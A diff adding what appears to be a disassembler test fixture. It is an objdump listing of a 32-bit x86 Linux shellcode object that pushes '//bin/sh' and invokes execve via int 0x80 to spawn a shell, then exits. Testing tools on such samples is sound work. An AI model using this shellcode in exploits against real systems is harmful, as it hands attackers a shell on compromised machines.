@@ -1,0 +1,17 @@
+shellcode32.o:  file format ELF32-i386
+Disassembly of section .text:
+00000000 .text:
+       0: 31 c0                         xorl    %eax, %eax
+       2: 31 db                         xorl    %ebx, %ebx
+       4: 31 c9                         xorl    %ecx, %ecx
+       6: 31 d2                         xorl    %edx, %edx
+       8: b0 0b                         movb    $11, %al
+       a: 53                            pushl   %ebx
+       b: 68 6e 2f 73 68                pushl   $1752379246
+      10: 68 2f 2f 62 69                pushl   $1768042287
+      15: 89 e3                         movl    %esp, %ebx
+      17: cd 80                         int     $128
+      19: b0 01                         movb    $1, %al
+      1b: 31 db                         xorl    %ebx, %ebx
+      1d: cd 80                         int     $128
+
